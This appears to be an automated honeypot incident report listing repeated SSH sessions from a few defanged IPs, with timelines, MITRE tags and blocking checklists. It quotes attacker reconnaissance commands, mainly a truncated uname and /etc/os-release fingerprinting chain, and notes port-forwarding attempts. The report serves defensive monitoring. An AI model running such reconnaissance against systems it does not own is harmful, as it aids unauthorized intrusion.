**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:34:47` | `cowrie.session.connect` |
| `2026-08-02 03:34:47` | `cowrie.client.version` |
| `2026-08-02 03:34:47` | `cowrie.client.kex` |
| `2026-08-02 03:34:47` | `cowrie.login.success` |
| `2026-08-02 03:34:48` | `cowrie.session.params` |
| `2026-08-02 03:34:48` | `cowrie.command.input` |
| `2026-08-02 03:34:48` | `cowrie.log.closed` |
| `2026-08-02 03:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dba1635bd00

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:35 |
| **Last Seen** | 2026-08-02 03:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:35:18` | `cowrie.session.connect` |
| `2026-08-02 03:35:19` | `cowrie.client.version` |
| `2026-08-02 03:35:19` | `cowrie.client.kex` |
| `2026-08-02 03:35:20` | `cowrie.login.success` |
| `2026-08-02 03:35:21` | `cowrie.session.params` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.success` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.command.input` |
| `2026-08-02 03:35:21` | `cowrie.log.closed` |
| `2026-08-02 03:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169e115b5d24

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:36 |
| **Last Seen** | 2026-08-02 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:36:16` | `cowrie.session.connect` |
| `2026-08-02 03:36:16` | `cowrie.client.version` |
| `2026-08-02 03:36:16` | `cowrie.client.kex` |
| `2026-08-02 03:36:17` | `cowrie.login.success` |
| `2026-08-02 03:36:17` | `cowrie.session.params` |
| `2026-08-02 03:36:17` | `cowrie.command.input` |
| `2026-08-02 03:36:18` | `cowrie.log.closed` |
| `2026-08-02 03:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222846c2b1f0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:36 |
| **Last Seen** | 2026-08-02 03:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:36:25` | `cowrie.session.connect` |
| `2026-08-02 03:36:26` | `cowrie.client.version` |
| `2026-08-02 03:36:26` | `cowrie.client.kex` |
| `2026-08-02 03:36:27` | `cowrie.login.success` |
| `2026-08-02 03:36:29` | `cowrie.session.params` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.success` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.command.input` |
| `2026-08-02 03:36:29` | `cowrie.log.closed` |
| `2026-08-02 03:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-672e88a6d06a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:37 |
| **Last Seen** | 2026-08-02 03:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:37:32` | `cowrie.session.connect` |
| `2026-08-02 03:37:32` | `cowrie.client.version` |
| `2026-08-02 03:37:32` | `cowrie.client.kex` |
| `2026-08-02 03:37:33` | `cowrie.login.success` |
| `2026-08-02 03:37:35` | `cowrie.session.params` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.success` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.command.input` |
| `2026-08-02 03:37:35` | `cowrie.log.closed` |
| `2026-08-02 03:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2241fda9d82c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:37 |
| **Last Seen** | 2026-08-02 03:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:37:49` | `cowrie.session.connect` |
| `2026-08-02 03:37:49` | `cowrie.client.version` |
| `2026-08-02 03:37:49` | `cowrie.client.kex` |
| `2026-08-02 03:37:49` | `cowrie.login.success` |
| `2026-08-02 03:37:50` | `cowrie.session.params` |
| `2026-08-02 03:37:50` | `cowrie.command.input` |
| `2026-08-02 03:37:50` | `cowrie.log.closed` |
| `2026-08-02 03:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a2cf6bf922

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:38 |
| **Last Seen** | 2026-08-02 03:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:38:40` | `cowrie.session.connect` |
| `2026-08-02 03:38:40` | `cowrie.client.version` |
| `2026-08-02 03:38:40` | `cowrie.client.kex` |
| `2026-08-02 03:38:41` | `cowrie.login.success` |
| `2026-08-02 03:38:42` | `cowrie.session.params` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.success` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:42` | `cowrie.command.input` |
| `2026-08-02 03:38:43` | `cowrie.log.closed` |
| `2026-08-02 03:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30549357172

| Field | Detail |
|---|---|
| **Source IP** | `115.245.122[.]146` |
| **First Seen** | 2026-08-02 03:38 |
| **Last Seen** | 2026-08-02 03:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:38:48` | `cowrie.session.connect` |
| `2026-08-02 03:38:49` | `cowrie.client.version` |
| `2026-08-02 03:38:49` | `cowrie.client.kex` |
| `2026-08-02 03:38:51` | `cowrie.login.success` |
| `2026-08-02 03:38:52` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.245.122[.]146` to AbuseIPDB if not already reported
- [ ] Block `115.245.122[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfbdfbbaca5

| Field | Detail |
|---|---|
| **Source IP** | `125.25.183[.]157` |
| **First Seen** | 2026-08-02 03:38 |
| **Last Seen** | 2026-08-02 03:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:38:57` | `cowrie.session.connect` |
| `2026-08-02 03:38:58` | `cowrie.client.version` |
| `2026-08-02 03:38:58` | `cowrie.client.kex` |
| `2026-08-02 03:39:00` | `cowrie.login.success` |
| `2026-08-02 03:39:01` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.25.183[.]157` to AbuseIPDB if not already reported
- [ ] Block `125.25.183[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8bb108362dc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:39 |
| **Last Seen** | 2026-08-02 03:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:39:25` | `cowrie.session.connect` |
| `2026-08-02 03:39:25` | `cowrie.client.version` |
| `2026-08-02 03:39:25` | `cowrie.client.kex` |
| `2026-08-02 03:39:25` | `cowrie.login.success` |
| `2026-08-02 03:39:26` | `cowrie.session.params` |
| `2026-08-02 03:39:26` | `cowrie.command.input` |
| `2026-08-02 03:39:26` | `cowrie.log.closed` |
| `2026-08-02 03:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47c9b55cb85

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:39 |
| **Last Seen** | 2026-08-02 03:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:39:42` | `cowrie.session.connect` |
| `2026-08-02 03:39:43` | `cowrie.client.version` |
| `2026-08-02 03:39:43` | `cowrie.client.kex` |
| `2026-08-02 03:39:45` | `cowrie.login.success` |
| `2026-08-02 03:39:46` | `cowrie.session.params` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.success` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:46` | `cowrie.command.input` |
| `2026-08-02 03:39:47` | `cowrie.log.closed` |
| `2026-08-02 03:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf83872461e8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:40 |
| **Last Seen** | 2026-08-02 03:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:40:44` | `cowrie.session.connect` |
| `2026-08-02 03:40:45` | `cowrie.client.version` |
| `2026-08-02 03:40:45` | `cowrie.client.kex` |
| `2026-08-02 03:40:46` | `cowrie.login.success` |
| `2026-08-02 03:40:47` | `cowrie.session.params` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.success` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:47` | `cowrie.command.input` |
| `2026-08-02 03:40:48` | `cowrie.log.closed` |
| `2026-08-02 03:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a66b0bb363

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:41 |
| **Last Seen** | 2026-08-02 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:41:00` | `cowrie.session.connect` |
| `2026-08-02 03:41:00` | `cowrie.client.version` |
| `2026-08-02 03:41:00` | `cowrie.client.kex` |
| `2026-08-02 03:41:00` | `cowrie.login.success` |
| `2026-08-02 03:41:01` | `cowrie.session.params` |
| `2026-08-02 03:41:01` | `cowrie.command.input` |
| `2026-08-02 03:41:01` | `cowrie.log.closed` |
| `2026-08-02 03:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60fec698d58e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:41 |
| **Last Seen** | 2026-08-02 03:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:41:53` | `cowrie.session.connect` |
| `2026-08-02 03:41:53` | `cowrie.client.version` |
| `2026-08-02 03:41:53` | `cowrie.client.kex` |
| `2026-08-02 03:41:54` | `cowrie.login.success` |
| `2026-08-02 03:41:55` | `cowrie.session.params` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.success` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.command.input` |
| `2026-08-02 03:41:55` | `cowrie.log.closed` |
| `2026-08-02 03:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16057a86a168

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-02 03:42 |
| **Last Seen** | 2026-08-02 03:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:42:33` | `cowrie.session.connect` |
| `2026-08-02 03:42:33` | `cowrie.client.version` |
| `2026-08-02 03:42:34` | `cowrie.client.kex` |
| `2026-08-02 03:42:34` | `cowrie.login.success` |
| `2026-08-02 03:42:35` | `cowrie.session.params` |
| `2026-08-02 03:42:35` | `cowrie.command.input` |
| `2026-08-02 03:42:35` | `cowrie.log.closed` |
| `2026-08-02 03:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ba359d07f4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 03:43 |
| **Last Seen** | 2026-08-02 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:43:12` | `cowrie.session.connect` |
| `2026-08-02 03:43:12` | `cowrie.client.version` |
| `2026-08-02 03:43:12` | `cowrie.client.kex` |
| `2026-08-02 03:43:12` | `cowrie.login.success` |
| `2026-08-02 03:43:13` | `cowrie.session.params` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.success` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.command.input` |
| `2026-08-02 03:43:13` | `cowrie.log.closed` |
| `2026-08-02 03:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582e642b1a1d

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-02 03:43 |
| **Last Seen** | 2026-08-02 03:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 03:43:46` | `cowrie.session.connect` |
| `2026-08-02 03:43:46` | `cowrie.client.version` |
| `2026-08-02 03:43:46` | `cowrie.client.kex` |
| `2026-08-02 03:43:47` | `cowrie.login.success` |
| `2026-08-02 03:43:48` | `cowrie.direct-tcpip.request` |
| `2026-08-02 03:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift
